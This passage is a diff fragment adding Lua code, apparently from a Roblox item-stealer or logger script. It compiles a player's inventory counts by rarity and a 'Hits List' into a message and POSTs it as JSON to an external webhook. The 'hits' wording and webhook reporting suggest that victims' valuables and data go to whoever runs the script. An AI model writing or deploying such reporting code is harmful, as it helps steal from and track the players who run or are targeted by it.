+						},
+						{
+							name = "🪐 __/__ **`Inventory:`**",
+							value = "```" .. table.concat({
+								"Total Value 📚 : " .. tostring(total_value),
+								"",
+								"Uniques     🍄 : " .. tostring(unique_count),
+								"Ancient     🌿 : " .. tostring(ancient_count),
+								"Godly       💎 : " .. tostring(godly_count),
+								"Legendary   ⚡ : " .. tostring(legendary_count),
+								"Vintage     🧊 : " .. tostring(vintage_count),
+								"Rare        🌈 : " .. tostring(rare_count),
+								"Halloween   🎃 : " .. tostring(halloween_count),
+								"Christmas   🎄 : " .. tostring(christmas_count),
+								"Uncommon    🌸 : " .. tostring(uncommon_count),
+								"Common      📦 : " .. tostring(common_count)
+							}, "\n") .. "```",
+							inline = false
+						},
+						{
+							name = "Hits List:",
+							value = PASTEBIN_SHIT,
+							inline = false
+						}
+					}
+				}}
+			}
+
+			request({
+				Url = Webhook,
+				Method = "POST",
+				Headers = {
+					["Content-Type"] = "application/json"
+				},
+				Body = game:GetService("HttpService"):JSONEncode(t5)
+			})
+
+			return
+		end
+
+		return
+	end
+
+	return
+end
